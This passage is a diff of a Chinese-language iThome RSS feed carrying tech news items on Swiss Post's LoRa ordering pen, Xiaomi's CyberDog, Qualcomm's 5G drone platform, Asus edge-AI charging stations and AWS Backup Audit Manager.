+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  瑞士郵政 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  LoRa  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;百年瑞士郵政推到府快遞服務，結合一鍵訂購IoT按鈕免出門就能寄信&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/%40%E5%9C%963%EF%BC%9A%E5%9C%963_IoT%E9%9B%99%E5%91%A8%E5%A0%B1.jpg&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;因應數位化浪潮，百年老字號的瑞士郵政（Swiss Post） 也積極轉型，最近更開始運用物聯網技術，將郵務服務結合一鍵訂購IoT按鈕，提供民眾更迅速到府快遞服務。&lt;/p&gt;
+&lt;p&gt;這個一鍵訂購IoT按鈕外型，就像是一支觸控筆，不僅裝了LoRa收發器，還內建OID光學感測器，使用者只須按下筆上按鈕，就能用它感應印刷紙上的數位訊息，來完成郵務服務申請的動作，包括寄送信件和運送包裹、選購郵票，連取款或支付帳單等，都能夠過它來一鍵完成。&lt;/p&gt;
+&lt;p&gt;觸控筆讀取到訂單訊息，會透過LoRa物聯網網路，將訂單回傳到瑞士郵政雲端伺服器，系統接到訂單後就會進行任務指派，郵務員收到通知後就會到府來取件，民眾免出門。就像亞馬遜幾年前推出了一鍵式訂購按鈕那樣。&lt;/p&gt;
+&lt;p&gt;因採用低功耗LoRa無線傳輸技術來進行數據傳輸，所以不像使用Wi-Fi或4G，即使是民眾住家附近沒有任何郵局，或是居住偏遠地區沒有網路也能用。而且其LoRa通訊範圍可以覆蓋97%的瑞士人口。迄今為止，在瑞士已有超過10萬人使用這項IoT到府快遞服務，更有40萬戶家庭將跟進採用。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt; 四足機器人   &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  小米  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;小米首款平價四足機器人CyberDog亮相 &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/%40%E5%9C%964%EF%BC%9A%E5%9C%964_IoT%E9%9B%99%E5%91%A8%E5%A0%B1.jpg&quot; style=&quot;width: 600px; height: 300px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;小米在本月新品發表會上展示其打造的首款四足機器人CyberDog，不僅可以依據主人口令完成如握手、繞圈子等動作，甚至連後空翻都難不倒它。&lt;/p&gt;
+&lt;p&gt;CyberDog外型也與機器人公司Boston Dynamics的機器狗Spot相似，同樣有四隻腳，並能自主行走。CyberDog身體能力相當強，最大扭力輸出可達32牛頓米（Nm），以及220 RPM每分鐘轉速，讓它可靈活移動和完成後空翻等複雜動作。&lt;/p&gt;
+&lt;p&gt;CyberDog的AI大腦則是使用Nvidia邊緣AI硬體Jetson Xavier NX做開發， 還搭配了11種高精度感測器，來感知周遭環境，包括觸摸感測器、超聲波感測器、廣角魚眼鏡頭、GPS定位模組等，還整合Intel RealSense深度攝影機來建立立體影像環境，用於機器人AI視覺訓練。&lt;/p&gt;
+&lt;p&gt;現階段而言，CyberDog表現還不如機器狗Spot聰明，只能完成一些簡單的指令動作，還無法做出複雜連續性動作，如跳繩、跳舞等。不過， CyberDog價格僅不到Spot的55分之一，約臺幣4萬2。小米初期僅提供1千臺，供開發人員及機器人愛好者使用。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;高通  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  無人機平臺   &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;高通發表新一代5G無人機參考設計平臺，並整合邊緣運算AI推論能力 &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/%40%E5%9C%965%EF%BC%9A%E5%9C%965_IoT%E9%9B%99%E5%91%A8%E5%A0%B1.jpg&quot; style=&quot;width: 600px; height: 400px;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;高通最近發布新一代無人機參考設計平臺Qualcomm Flight RB5 5G，整合5G和AI功能，來提供無人機更安全、更可靠的飛航能力，未來可用於商業、企業和工業無人機的開發，打造高性能、低功耗的5G無人機。&lt;/p&gt;
+&lt;p&gt;這個參考設計平臺硬體，整合邊緣運算AI推論能力，CPU採用Kryo 585 處理器，搭配Adreno 650 GPU，可提供15 TOPS（每秒兆次運算），還整合高通AI加速器Hexagon 680 DSP，可以直接在無人機上執行複雜DL（深度學習）推論模型，且最多可支援7臺攝影機擷取影像。&lt;/p&gt;
+&lt;p&gt;網路方面，其所採用QRB5165處理器是基於Snapdragon 865晶片來設計， 可以支援5G毫米波和最新Wi-Fi 6。高通無人機開發套件預計將於 2021年底前上市。該公司目前正與美國電信商Verizon合作，使用其5G網路進行測試。&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;華碩  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  Edge AI   &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;華碩運用Edge AI技術打造電動車專用快充站，不只能就近辨識車牌，還可連動計費&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;華碩與華城電能合作，在內湖打造一座電動車專用快充站，在這個充電設備內整合華碩Edge AI開發套件，並搭配攝影機，不僅可以就近提供AI車牌辨識，還結合白名單比對，可以自動且快速完成停車位地鎖操作，讓需要充電的車主使用更方便。他們將車牌辨識功能與充電系統串接，能夠連動計費，車主離場時可一併繳納充電與停車費用。&lt;/p&gt;
+&lt;p&gt;圖片來源/Swiss Post、Google、小米、高通&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt; 更多IoT動態 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1.安全廠商IoT Inspector發現臺廠Realtek無線裝置晶片存有安全漏洞，恐影響數十家IoT廠商產品&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2. MarketsandMarkets預測，工業IoT應用市場規模5年內將突破千億美元大關，達到1,061億美元&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;資料來源：iThome整理，2021年8月&lt;/strong&gt;&lt;/p&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 26 Aug 2021 02:13:52 +0000</pubDate>
  <dc:creator>余至浩</dc:creator>
- <guid isPermaLink="false">146377 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146377#comments</comments>
+ <guid isPermaLink="false">146391 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146391#comments</comments>
+</item>
+<item>
+ <title>AWS Backup新功能Audit Manager可監控備份產生稽核用報告</title>
+ <link>https://www.ithome.com.tw/news/146390</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;AWS宣布推出&lt;a href=&quot;https://aws.amazon.com/tw/blogs/aws/monitor-evaluate-and-demonstrate-backup-compliance-with-aws-backup-audit-manager/&quot;&gt;AWS Backup Audit Manager&lt;/a&gt;，這是備份服務AWS Backup的一項新功能，可讓用戶監控和評估備份的法遵狀態，來滿足業務和法規要求，並且讓用戶能夠生成報告，向稽核人員和監管機構說明其法遵狀態。&lt;/p&gt;
+&lt;p&gt;AWS Backup是一項完全託管的服務，藉由制定政策對AWS應用程式進行備份和還原，用戶不需要自定義腳本和手動操作，因此能簡化大規模備份工作，但AWS提到，用戶仍需要使用自己的工具來驗證備份政策的執行，並且解析備份紀錄，將其轉換成為提供給稽核人員的報告。&lt;/p&gt;
+&lt;p&gt;為了解決這個問題，AWS在備份服務加入Audit Manager功能，持續自動追蹤備份活動，像是備份計畫或是備份保管庫的更改，還能自動生成每日報告，官方提到，AWS Backup Audit Manager提供內建可自定義的法遵控制元件，這些控制元件便是具有備份政策參數的程序，包括備份頻率或是保留時間，來符合業務法規要求。&lt;/p&gt;
+&lt;p&gt;簡單來說，Audit Manager可讓用戶創建一個框架，設定監控的帳戶和地區，並添加需要的控制元件，而控制元件會自動追蹤備份活動，並且偵測違反用戶所定義的資料保護政策行為，提醒用戶快速修正錯誤。&lt;/p&gt;
+&lt;p&gt;當需要滿足多個不同的內部或是監管標準，用戶可以創建和部署額外的控制框架，在框架部署之後，便能每日自動生成備份活動報告，除了顯示在儀表板之外，也能夠按需生成報告。官方在Audit Manager中提供了5個備份治理控制樣板，以及備份、複製和還原任務的備份活動報告，這些報告能夠提高用戶對單個帳戶和地區備份活動的掌握程度，透過監控操作狀態來辨識需要介入的故障。&lt;/p&gt;
+&lt;p&gt;AWS Backup Audit Manager已經在許多AWS地區上線，包括美東、美西、加拿大、歐洲、南美洲和中東，而亞太則在香港、孟買、首爾、新加坡、雪梨和東京地區提供，用戶直接存取AWS Backup控制臺，就能立刻開始使用Audit Manager功能。&lt;/p&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 26 Aug 2021 02:04:15 +0000</pubDate>
+ <dc:creator>李建興</dc:creator>
+ <guid isPermaLink="false">146390 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146390#comments</comments>
 </item>
 </channel>
 </rss>
